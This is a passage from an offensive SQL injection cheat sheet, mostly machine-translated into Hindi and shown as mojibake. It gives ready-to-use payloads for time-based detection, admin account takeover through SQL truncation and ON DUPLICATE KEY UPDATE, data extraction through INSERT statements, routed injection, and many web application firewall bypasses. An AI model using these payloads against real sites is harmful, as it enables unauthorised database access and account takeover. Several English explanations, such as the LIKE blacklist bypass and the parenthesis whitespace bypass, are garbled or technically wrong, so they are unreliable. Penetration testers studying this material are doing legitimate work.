It is important to note that polyglot injections can be more complex to create and execute compared to regular SQL injections. The attacker needs to carefully design the payload to ensure it is valid in multiple contexts and does not raise any errors or exceptions.

Overall, polyglot injection is a powerful technique that allows attackers to target a wide range of web applications, regardless of the specific DBMS or programming language used. Web developers and security professionals should be aware of this technique and take appropriate measures to prevent SQL injection vulnerabilities in their applications.
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## рдЗрдВрд╕рд░реНрдЯ рд╕реНрдЯреЗрдЯрдореЗрдВрдЯ

### рдореМрдЬреВрджрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ/рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ

рдЗрд╕рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ "рдорд╛рд╕реНрдЯрд░ рдСрдмреНрдЬреЗрдХреНрдЯ" рдХреЗ рд░реВрдк рдореЗрдВ рдирдпрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП (рд╕рдВрднрд╡рддрдГ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ **рдПрдбрдорд┐рди**):

* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо: **рдПрдбрдорд┐рди** (рдЕрдкрд░рдХреЗрд╕ рдФрд░ рд▓реЛрдЕрд░рдХреЗрд╕ рдЕрдХреНрд╖рд░)
* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо: **рдПрдбрдорд┐рди=**
* **SQL Truncation рд╣рдорд▓рд╛** (рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдпрд╛ рдИрдореЗрд▓ рдореЗрдВ рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рдХреА **рд▓рдВрдмрд╛рдИ рд╕реАрдорд╛** рд╣реЛрддреА рд╣реИ) --> рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдПрдВ: **рдПрдбрдорд┐рди \[рдмрд╣реБрдд рд╕рд╛рд░реЗ рдЕрдВрддрд░рд┐рдХреНрд╖] рдП**

#### SQL Truncation рд╣рдорд▓рд╛

рдпрджрд┐ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХрддрдо рдЕрдХреНрд╖рд░реЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП 30 рд╣реИ рдФрд░ рдЖрдк **рдПрдбрдорд┐рди** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ "_рдПрдбрдорд┐рди \[30 рдЕрдВрддрд░рд┐рдХреНрд╖] рдП_" рдирд╛рдордХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдмрдирд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдХреЛрдИ рдкрд╛рд╕рд╡рд░реНрдбред

рдбреЗрдЯрд╛рдмреЗрд╕ **рдЬрд╛рдВрдЪреЗрдЧрд╛** рдХрд┐ рджрд░реНрдЬ рдХрд┐рдпрд╛ рдЧрдпрд╛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рдЕрдВрджрд░ **рдореМрдЬреВрдж рд╣реИ** рдпрд╛ рдирд╣реАрдВред рдпрджрд┐ **рдирд╣реАрдВ**, рддреЛ рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЛ **рдЕрдзрд┐рдХрддрдо рдЕрдиреБрдордд рдЕрдХреНрд╖рд░реЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рддрдХ рдХрд╛рдЯ рджреЗрдЧрд╛** (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ: "_рдПрдбрдорд┐рди \[25 рдЕрдВрддрд░рд┐рдХреНрд╖]_") рдФрд░ рдпрд╣ рдЖрдкрдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ "**рдПрдбрдорд┐рди**" рдХреЛ **рдирдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЕрдкрдбреЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╕рднреА рдЕрдВрддрд░рд┐рдХреНрд╖реЛрдВ рдХреЛ рд╣рдЯрд╛ рджреЗрдЧрд╛** (рдХреБрдЫ рддреНрд░реБрдЯрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдпрд╣ рдирд╣реАрдВ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛)ред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_рдиреЛрдЯ: рдпрд╣ рд╣рдорд▓рд╛ рдирд╡реАрдирддрдо MySQL рд╕реНрдерд╛рдкрдирд╛рдУрдВ рдореЗрдВ рдЙрдкрд░реЛрдХреНрдд рд╡рд┐рд╡рд░рдг рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рддреБрд▓рдирд╛рдПрдБ рдЕрднреА рднреА рдЕрдВрддрд┐рдо рд░рд┐рдХреНрдд рд╕реНрдерд╛рдиреЛрдВ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░реЗрдВрдЧреА, рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рдПрдХ рдлрд╝реАрд▓реНрдб рдХреА рд▓рдВрдмрд╛рдИ рд╕реЗ рдЕрдзрд┐рдХ рд▓рдВрдмрд╛ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдбрд╛рд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рддреНрд░реБрдЯрд┐ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдЧрд╛ рдФрд░ рд╕рдВрдпреЛрдЬрди рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ_ [_https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation_](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)\_\_

### MySQL рдЗрдВрд╕рд░реНрдЯ рд╕рдордп рдЖрдзрд╛рд░рд┐рдд рдЬрд╛рдВрдЪ

VALUES рд╕реНрдЯреЗрдЯрдореЗрдВрдЯ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рддрдиреЗ рднреА `','',''` рдЖрдкрдХреЛ рдЙрдЪрд┐рдд рд╕рдордЭреЗрдВ рдЙрдиреНрд╣реЗрдВ рдЬреЛрдбрд╝реЗрдВред рдпрджрд┐ рджреЗрд░реА рд╣реЛрддреА рд╣реИ, рддреЛ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ SQLInjection рд╣реИред
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

ON DUPLICATE KEY UPDATE рдХреАрд╡рд░реНрдб MySQL рдХреЛ рдмрддрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдЬрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЯреЗрдмрд▓ рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рдПрдХ рдкрдВрдХреНрддрд┐ рдХреЛ рдЗрдВрд╕рд░реНрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ рддреЛ рдХреНрдпрд╛ рдХрд░рдирд╛ рд╣реИред рд╣рдо рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдбрдорд┐рди рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
Inject using payload:
attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --

The query would look like this:
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");

This query will insert a row for the user тАЬattacker_dummy@example.comтАЭ. It will also insert a row for the user тАЬadmin@example.comтАЭ.
Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to "bcrypt_hash_of_qwerty".

After this, we can simply authenticate with тАЬadmin@example.comтАЭ and the password тАЬqwertyтАЭ!
```
### рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓реЗрдВ

#### рджреЛ рдЦрд╛рддреЗ рдПрдХ рд╕рд╛рде рдмрдирд╛рдирд╛

рдирдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо, рдкрд╛рд╕рд╡рд░реНрдб рдФрд░ рдИрдореЗрд▓ рдмрдирд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╕рдордп:
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### рджрд╢рдорд▓рд╡ рдпрд╛ рд╖реЛрдзрд┐рддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ

рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рд╕рд╛рде рдЖрдк рдХреЗрд╡рд▓ 1 рдЦрд╛рддрд╛ рдмрдирд╛рдХрд░ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдЖрдкрдХреЛ рдХреБрдЫ рднреА рдЯрд┐рдкреНрдкрдгреА рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред

**hex2dec** рдФрд░ **substr** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
рдЯреЗрдХреНрдирд┐рдХрд▓ рдЯрд░реНрдореНрд╕ рдХреЛ рд╣рд┐рдВрджреА рдореЗрдВ рдЕрдиреБрд╡рд╛рдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░рдХреЗ **hex** рдФрд░ **replace** (рдФрд░ **substr**):
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

тАЛтАЛтАЛтАЛтАЛтАЛ[**RootedCON**](https://www.rootedcon.com/) рд╕реНрдкреЗрди рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╣реИ рдФрд░ рдпреВрд░реЛрдк рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред **рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ** рдХреА рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рд╕рдореНрдореЗрд▓рди рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдмрд▓рддрд╛ рд╣реБрдЖ рдорд┐рд▓рди рд╕реНрдерд╛рди рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

## рд░реВрдЯреЗрдб SQL рдЗрдВрдЬреЗрдХреНрд╢рди

рд░реВрдЯреЗрдб SQL рдЗрдВрдЬреЗрдХреНрд╢рди рдПрдХ рд╕реНрдерд┐рддрд┐ рд╣реИ рдЬрд╣рд╛рдВ рдЗрдВрдЬреЗрдХреНрдЯреЗрдмрд▓ рдХреНрд╡реЗрд░реА рд╡рд╣ рдирд╣реАрдВ рд╣реИ рдЬреЛ рдЖрдЙрдЯрдкреБрдЯ рджреЗрддреА рд╣реИ, рдмрд▓реНрдХрд┐ рдЗрдВрдЬреЗрдХреНрдЯреЗрдмрд▓ рдХреНрд╡реЗрд░реА рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рд╡рд╣ рдХреНрд╡реЗрд░реА рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЖрдЙрдЯрдкреБрдЯ рджреЗрддреА рд╣реИред ([рдкреЗрдкрд░](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

рдЙрджрд╛рд╣рд░рдг:
```sql
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## WAF рдмрд╛рдИрдкрд╛рд╕

### рдХреЛрдИ рдЬрдЧрд╣ рдирд╣реАрдВ рдмрд╛рдИрдкрд╛рд╕

рдХреЛрдИ рдЬрдЧрд╣ (%20) - рд╢реНрд╡реЗрддрд╕реНрдерд╛рди рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рдИрдкрд╛рд╕ рдХрд░реЗрдВ
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
# No Whitespace - рдЯрд┐рдкреНрдкрдгрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рдИрдкрд╛рд╕ рдХрд░реЗрдВ

Sometimes, web applications filter or block certain characters or keywords to prevent SQL injection attacks. In such cases, you can use comments to bypass these filters and successfully execute SQL injection.

рдЕрдХреНрд╕рд░, рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдирд┐рд╢реНрдЪрд┐рдд рд╡рд░реНрдг рдпрд╛ рд╢рдмреНрджреЛрдВ рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдпрд╛ рдмреНрд▓реЙрдХ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ SQL рдЗрдВрдЬреЗрдХреНрд╢рди рд╣рдорд▓реЛрдВ рдХреЛ рд░реЛрдХ рд╕рдХреЗрдВред рдРрд╕реЗ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдЖрдк рдЯрд┐рдкреНрдкрдгрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрди рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ SQL рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## Technique

To bypass filters that block certain characters or keywords, you can use comments in your SQL injection payload. Comments in SQL are denoted by `--` or `/* */`.

рдирд┐рд╢реНрдЪрд┐рдд рд╡рд░реНрдг рдпрд╛ рд╢рдмреНрджреЛрдВ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдЕрдкрдиреЗ SQL рдЗрдВрдЬреЗрдХреНрд╢рди рдкреЗрд▓реЛрдб рдореЗрдВ рдЯрд┐рдкреНрдкрдгрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред SQL рдореЗрдВ рдЯрд┐рдкреНрдкрдгрд┐рдпрд╛рдБ `--` рдпрд╛ `/* */` рджреНрд╡рд╛рд░рд╛ рджрд░реНрд╢рд╛рдИ рдЬрд╛рддреА рд╣реИрдВред

For example, if the application filters the keyword `SELECT`, you can bypass it by using comments like `SEL/*comment*/ECT`.

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди `SELECT` рд╢рдмреНрдж рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЖрдк `SEL/*comment*/ECT` рдЬреИрд╕реА рдЯрд┐рдкреНрдкрдгрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ рдмрд╛рдИрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## Conclusion

Using comments in your SQL injection payload can help you bypass filters that block certain characters or keywords. This technique can be useful in situations where direct injection is not possible due to filtering mechanisms.

рдЕрдкрдиреЗ SQL рдЗрдВрдЬреЗрдХреНрд╢рди рдкреЗрд▓реЛрдб рдореЗрдВ рдЯрд┐рдкреНрдкрдгрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рдЖрдк рдирд┐рд╢реНрдЪрд┐рдд рд╡рд░реНрдг рдпрд╛ рд╢рдмреНрджреЛрдВ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рддрдХрдиреАрдХ рдЙрди рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬрд╣рд╛рдВ рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо рдХреЗ рдХрд╛рд░рдг рд╕реАрдзрд╛ рдЗрдВрдЬреЗрдХреНрд╢рди рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред
```sql
?id=1/*comment*/and/**/1=1/**/--
```
## No Whitespace - рдкреИрд░реЗрдВрдереЗрд╕рд┐рд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рдИрдкрд╛рд╕ рдХрд░реЗрдВ

In some cases, web applications may have filters in place that block certain characters or keywords, such as whitespace. However, it is still possible to bypass these filters and perform SQL injection by using parentheses.

### Technique

1. Identify the vulnerable parameter in the URL or form input.
2. Craft a SQL injection payload using parentheses to bypass the whitespace filter. For example:

   ```
   ' OR 1=1)--
   ```

   In this payload, the closing parenthesis `)` is used to close the existing SQL query and the double hyphen `--` is used to comment out the rest of the query.

3. Submit the payload and observe the application's response. If the application is vulnerable, it will likely return data that it shouldn't.

### Example

Consider the following vulnerable PHP code:

```php
$param = $_GET['id'];
$query = "SELECT * FROM users WHERE id = '$param'";
```

If the application has a whitespace filter in place, the following payload would be blocked:

```
' OR 1=1 --
```

However, by using parentheses, we can bypass the filter:

```
' OR 1=1)--
```

This payload would result in the following SQL query:

```sql
SELECT * FROM users WHERE id = '' OR 1=1)--
```

The closing parenthesis closes the existing query, and the double hyphen comments out the rest of the query. As a result, the application will return data from the `users` table, regardless of the value of the `id` parameter.

### Conclusion

By using parentheses, it is possible to bypass whitespace filters and perform SQL injection attacks. However, it is important to note that this technique may not work in all cases, as it depends on the specific implementation of the filter. It is always recommended to thoroughly test the application for vulnerabilities before attempting any SQL injection attacks.
```sql
?id=(1)and(1)=(1)--
```
### рдХреЛрдИ рдХреЛрдорд╛ рдмрд╛рдЗрдкрд╛рд╕

рдХреЛрдИ рдХреЛрдорд╛ - OFFSET, FROM рдФрд░ JOIN рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░реЗрдВ
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### рд╕рд╛рдорд╛рдиреНрдп рдмрд╛рдЗрдкрд╛рд╕

рдХреАрд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯ - рдЕрдкрд░рдХреЗрд╕/рд▓реЛрд╡рд░рдХреЗрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░реЗрдВ
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
## Blacklist using keywords case insensitive - bypass using an equivalent operator

### Introduction

In some cases, web applications implement a blacklist to prevent certain keywords from being used in user input. This is often done to mitigate the risk of SQL injection attacks. However, if the blacklist is implemented in a case-insensitive manner, it can be bypassed using an equivalent operator.

### Bypassing a Case-Insensitive Blacklist

To bypass a case-insensitive blacklist, you can use an equivalent operator that the blacklist does not account for. One such operator is the `LIKE` operator, which performs a case-insensitive comparison.

Here's an example of how you can bypass a case-insensitive blacklist using the `LIKE` operator:

```sql
SELECT * FROM users WHERE username LIKE '%admin%' --
```

In this example, the keyword "admin" is blacklisted. However, by using the `LIKE` operator with the wildcard `%` before and after the keyword, we can bypass the blacklist. The `--` at the end of the query is used to comment out the rest of the query and prevent any syntax errors.

### Conclusion

By understanding how a case-insensitive blacklist is implemented and using an equivalent operator like `LIKE`, you can bypass the blacklist and potentially exploit a SQL injection vulnerability in a web application. However, it's important to note that hacking into systems without proper authorization is illegal and unethical. This information is provided for educational purposes only.
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### рд╡реИрдЬреНрдЮрд╛рдирд┐рдХ рд░реВрдкрд╛рдВрддрд░рдг WAF рдмрд╛рдЗрдкрд╛рд╕

рдЖрдк рдЗрд╕ рдЯреНрд░рд┐рдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рд╡реНрдпрд╛рдЦреНрдпрд╛ [gosecure рдмреНрд▓реЙрдЧ](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/) рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред\
рдореВрд▓ рд░реВрдк рд╕реЗ, рдЖрдк WAF рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡реИрдЬреНрдЮрд╛рдирд┐рдХ рд░реВрдкрд╛рдВрддрд░рдг рдХрд╛ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рддрд░реАрдХреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### рдХреЙрд▓рдо рдирд╛рдореЛрдВ рдХреА рдкреНрд░рддрд┐рдмрдВрдз рдХреЛ рджреМрд░ рдХрд░реЗрдВ

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ **рдореВрд▓ рдХреНрд╡реЗрд░реА рдФрд░ рд╡рд╣ рддрд╛рд▓рд┐рдХрд╛ рдЬрд╣рд╛рдВ рд╕реЗ рдЖрдк рдлреНрд▓реИрдЧ рдирд┐рдХрд╛рд▓рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдХреЗ рдкрд╛рд╕ рдПрдХ рд╣реА рд╕рдВрдЦреНрдпрд╛ рдХреЗ рдХреЙрд▓рдо рд╣реЛрдВ** рддреЛ рдЖрдк рд╕реАрдзреЗ рдпрд╣ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `0 UNION SELECT * FROM flag`

